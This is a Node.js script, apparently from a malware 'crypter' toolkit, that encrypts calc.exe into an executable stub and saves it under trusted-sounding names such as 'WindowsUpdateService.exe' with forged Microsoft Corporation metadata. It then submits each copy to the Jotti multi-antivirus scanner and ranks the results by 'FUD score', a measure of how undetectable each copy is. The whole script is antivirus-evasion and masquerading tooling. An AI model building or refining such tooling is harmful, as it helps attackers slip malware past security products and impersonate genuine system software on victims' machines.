/**
 * Encrypt calc.exe with real names and scan with Jotti
 */

const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');

async function encryptCalcAndScan() {
    console.log('=== ENCRYPT CALC.EXE AND SCAN WITH JOTTI ===\n');
    
    try {
        // Load required engines
        console.log('Loading encryption engines...');
        const dualCrypto = require('./src/engines/dual-crypto-engine');
        const jottiScanner = require('./src/engines/jotti-scanner');
        
        await dualCrypto.initialize();
        await jottiScanner.initialize();
        console.log('[OK] Engines loaded\n');
        
        // Read calc.exe
        console.log('Reading calc.exe...');
        const calcPath = path.join(__dirname, 'calc.exe');
        const calcData = await fs.readFile(calcPath);
        console.log(`[OK] Read ${calcData.length} bytes from calc.exe\n`);
        
        // Create real-looking names instead of generated ones
        const realNames = [
            'WindowsUpdateService.exe',
            'SystemMaintenance.exe', 
            'PerformanceOptimizer.exe',
            'MemoryManager.exe',
            'ErrorHandler.exe',
            'LoggingSystem.exe',
            'SecurityUpdate.exe',
            'SystemService.exe',
            'WindowsService.exe',
            'MicrosoftUpdate.exe'
        ];
        
        const algorithms = [
            'aes-256-gcm',
            'aes-256-cbc', 
            'camellia-256-cbc',
            'chacha20-poly1305',
            'aria-256-gcm'
        ];
        
        const results = [];
        
        for (let i = 0; i < 5; i++) {
            const algorithm = algorithms[i];
            const realName = realNames[i];
            
            console.log(`\n--- Encrypting with ${algorithm} as ${realName} ---`);
            
            try {
                // Encrypt with real name
                const encryptionResult = await dualCrypto.encrypt(calcData, {
                    algorithm: 'aes-camellia-dual',
                    dataType: 'binary',
                    targetExtension: '.exe',
                    stubFormat: 'exe',
                    fileType: 'exe',
                    metadata: {
                        originalName: 'calc.exe',
                        displayName: realName,
                        description: 'Windows System Service',
                        company: 'Microsoft Corporation',
                        version: '10.0.19041.1',
                        copyright: '© Microsoft Corporation. All rights reserved.'
                    }
                });
                
                if (encryptionResult.success) {
                    // Save encrypted file with real name
                    const encryptedPath = path.join(__dirname, 'uploads', realName);
                    await fs.writeFile(encryptedPath, Buffer.from(encryptionResult.encryptedData, 'base64'));
                    console.log(`[OK] Saved encrypted file: ${realName}`);
                    
                    // Scan with Jotti
                    console.log(`[INFO] Scanning ${realName} with Jotti...`);
                    const scanResult = await jottiScanner.scanFile(encryptedPath);
                    
                    if (scanResult.success) {
                        console.log(`[SCAN] ${realName}:`);
                        console.log(`  Detection Rate: ${scanResult.summary.detectionRate}%`);
                        console.log(`  Status: ${scanResult.summary.status}`);
                        console.log(`  FUD Score: ${scanResult.summary.fudScore}`);
                        console.log(`  Detected: ${scanResult.summary.detected}/${scanResult.summary.engines}`);
                        
                        results.push({
                            filename: realName,
                            algorithm: algorithm,
                            detectionRate: scanResult.summary.detectionRate,
                            status: scanResult.summary.status,
                            fudScore: scanResult.summary.fudScore,
                            detected: scanResult.summary.detected,
                            total: scanResult.summary.engines
                        });
                    } else {
                        console.log(`[ERROR] Scan failed: ${scanResult.error}`);
                    }
                } else {
                    console.log(`[ERROR] Encryption failed: ${encryptionResult.error}`);
                }
                
            } catch (error) {
                console.log(`[ERROR] Failed to process ${realName}: ${error.message}`);
            }
        }
        
        // Summary
        console.log('\n=== SCAN RESULTS SUMMARY ===');
        console.log('Filename                    | Algorithm        | Detection | Status        | FUD Score');
        console.log('----------------------------|------------------|-----------|---------------|----------');
        
        results.forEach(result => {
            const filename = result.filename.padEnd(27);
            const algorithm = result.algorithm.padEnd(16);
            const detection = `${result.detectionRate}%`.padEnd(9);
            const status = result.status.padEnd(13);
            const fudScore = result.fudScore.toString().padEnd(9);
            
            console.log(`${filename} | ${algorithm} | ${detection} | ${status} | ${fudScore}`);
        });
        
        // Best results
        const bestFUD = results.reduce((best, current) => 
            current.fudScore > best.fudScore ? current : best
        );
        
        console.log(`\n[INFO] Best FUD Score: ${bestFUD.fudScore}% (${bestFUD.filename} with ${bestFUD.algorithm})`);
        console.log(`[INFO] Lowest Detection: ${Math.min(...results.map(r => r.detectionRate))}%`);
        
        console.log('\n[OK] Encryption and scanning completed!');
        
    } catch (error) {
        console.error('[ERROR] Failed:', error.message);
        console.error(error.stack);
    }
}

encryptCalcAndScan();
